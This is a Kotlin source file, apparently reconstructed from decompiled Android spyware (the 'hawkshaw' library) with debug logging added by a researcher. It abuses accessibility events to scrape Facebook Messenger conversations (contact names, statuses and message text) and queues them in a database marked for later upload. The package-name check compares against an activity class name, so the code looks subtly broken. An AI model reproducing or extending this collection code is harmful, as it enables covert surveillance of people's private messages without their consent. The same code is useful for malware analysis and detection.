package com.hawkshaw.library.features.accessibility.socialmedia

import android.util.Log // Added for logging
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findBy
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.getChildSafe
import com.hawkshaw.library.ktextensions.getEmpty
import com.hawkshaw.library.ktextensions.hash
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.ExecutorService

// Added a TAG for logging
private const val TAG = "FacebookMessenger_DEBUG"

/**
 * Handler for extracting messages from Facebook Messenger
 */
object FacebookMessenger {

    /**
     * Process a lambda for extracting messages and inserting the entity
     */
    private fun extractMessagesLambda(entity: UnprocessedSocialMediaEntity) {
        Log.d(TAG, "extractMessagesLambda called for entity ID: ${entity.id}, Title: '${entity.title}'")
        CoroutineScope(Dispatchers.IO).launch {
            Log.d(TAG, "extractMessagesLambda: Coroutine launched. Calling HandlerKt.insert for entity ID: ${entity.id}")
            HandlerKt.insert(entity)
            Log.d(TAG, "extractMessagesLambda: HandlerKt.insert likely completed for entity ID: ${entity.id}")
        }
    }

    /**
     * Recursively get the last child of an AccessibilityNodeInfo
     *
     * @param accessibilityNodeInfo The parent node
     * @return The deepest last child node
     */
    private fun getLastChild(accessibilityNodeInfo: AccessibilityNodeInfo): AccessibilityNodeInfo {
        Log.v(TAG, "getLastChild: Called with node: ${accessibilityNodeInfo.className}, ChildCount: ${accessibilityNodeInfo.childCount}, Text: '${accessibilityNodeInfo.text}'")
        if (accessibilityNodeInfo.childCount == 0) {
            Log.v(TAG, "getLastChild: Base case, returning current node (no children): ${accessibilityNodeInfo.className}")
            return accessibilityNodeInfo
        }
        val child = accessibilityNodeInfo.getChild(accessibilityNodeInfo.childCount - 1)
        if (child == null) {
            Log.w(TAG, "getLastChild: Last child is null, returning current node: ${accessibilityNodeInfo.className}")
            return accessibilityNodeInfo
        }
        return getLastChild(child).also {
            Log.v(TAG, "getLastChild: Returning from recursive call. Deepest child: ${it.className}, Text: '${it.text}'")
        }
    }

    /**
     * Extract messages from Facebook Messenger
     *
     * @param event The accessibility event
     * @param executor Executor service to process entities asynchronously
     */
    fun extractMessages(event: AccessibilityEvent, executor: ExecutorService) {
        Log.d(TAG, "extractMessages called. Event Package: ${event.packageName}, EventType: ${event.eventType}")

        val targetPackageName = "com.facebook.messenger.neue.MainActivity" // Specific to newer Messenger, adjust if needed
        // Check if the package name matches Facebook Messenger
        if (event.packageName?.toString() != targetPackageName) {
            Log.d(TAG, "extractMessages: Package name '${event.packageName}' does not match target '$targetPackageName'. Returning.")
            return
        }
        Log.i(TAG, "extractMessages: Package name matches target '$targetPackageName'. Proceeding.")

        // Get the source node
        val source = event.source
        if (source == null) {
            Log.w(TAG, "extractMessages: Event source is null. Returning.")
            return
        }
        Log.d(TAG, "extractMessages: Event source acquired: ${source.className}")

        // Find the recycler view containing messages
        val recyclerView = source.findBy(recyclerViewPredicate)
        if (recyclerView == null) {
            // Researcher.print("no recycler view") // Original line
            Log.w(TAG, "extractMessages: No RecyclerView found using predicate. Returning.")
            source.recycle() // Recycle the source node as we are done with it here.
            return
        }
        Log.i(TAG, "extractMessages: RecyclerView found: ${recyclerView.className}, ChildCount: ${recyclerView.childCount}")

        // Get message header information from the first child
        val headerNode = recyclerView.getChildSafe(0)
        if (headerNode == null) {
            Log.w(TAG, "extractMessages: Header node (RecyclerView child 0) is null.")
        } else {
            Log.d(TAG, "extractMessages: Header node acquired: ${headerNode.className}")
        }


        // Extract conversation details from header
        val nameText = headerNode?.getChildSafe(1)?.text
        val statusText = headerNode?.getChildSafe(2)?.text
        val additionalInfo = headerNode?.getChildSafe(3)?.text

        Log.d(TAG, "extractMessages: Header Info: Name='${nameText}', Status='${statusText}', Additional='${additionalInfo}'")

        // Iterate through all children of the recycler view (starting from index 1)
        for (i in 1 until recyclerView.childCount) {
            Log.d(TAG, "extractMessages: Processing RecyclerView child at index $i")
            // Get message text from the last child of the current node
            val messageNode = recyclerView.getChild(i)
            if (messageNode == null) {
                Log.w(TAG, "extractMessages: Message node at index $i is null. Skipping.")
                continue
            }
            Log.d(TAG, "extractMessages: Message node at index $i: ${messageNode.className}")

            val messageContentNode = getLastChild(messageNode)
            val messageText = messageContentNode.text

            if (messageText == null) {
                Log.w(TAG, "extractMessages: Message text is null for node at index $i (after getLastChild). Skipping.")
                messageNode.recycle() // Recycle the current message node
                continue
            }
            Log.i(TAG, "extractMessages: Extracted messageText (index $i): '${messageText.take(50)}...'") // Log a snippet

            // Create a unique identifier for this message
            val identifier = "$nameText-$messageText-${PackageName.FACEBOOK_MESSENGER}"
            val id = identifier.hash()
            Log.d(TAG, "extractMessages: Message ID: $id (from identifier: '${identifier.take(50)}...')")

            // Create metadata for the conversation
            val title = nameText.getEmpty()
            val status = "$statusText, $additionalInfo"
            val message = messageText.getEmpty()

            // Create the entity to store in the database
            val entity = UnprocessedSocialMediaEntity(
                id = id,
                title = title,
                status = status,
                sender = null, // Sender info might need more complex parsing if available
                message = message,
                type = SocialMediaEntity.Type.Unknown,
                application = PackageName.FACEBOOK_MESSENGER,
                timeString = "", // Timestamp extraction would need specific node identification
                uploaded = false
            )
            Log.d(TAG, "extractMessages: Created UnprocessedSocialMediaEntity: ID=${entity.id}, Title='${entity.title}', Message Snippet='${entity.message.take(50)}...'")

            // Process the entity asynchronously
            Log.d(TAG, "extractMessages: Submitting entity ID ${entity.id} to executor.")
            executor.execute { extractMessagesLambda(entity) }
            messageNode.recycle() // Recycle the message node after processing
        }
        recyclerView.recycle() // Recycle the recycler view node
        source.recycle() // Recycle the source node
        Log.d(TAG, "extractMessages: Finished processing messages.")
    }

    // Predicate to find recycler view (companion object in the M1.b class)
    private val recyclerViewPredicate: (AccessibilityNodeInfo) -> Boolean = { node ->
        val className = node.className?.toString()
        val check = className?.contains("RecyclerView") == true
        Log.v(TAG, "recyclerViewPredicate: Checking node: $className, Result: $check")
        check
    }
}
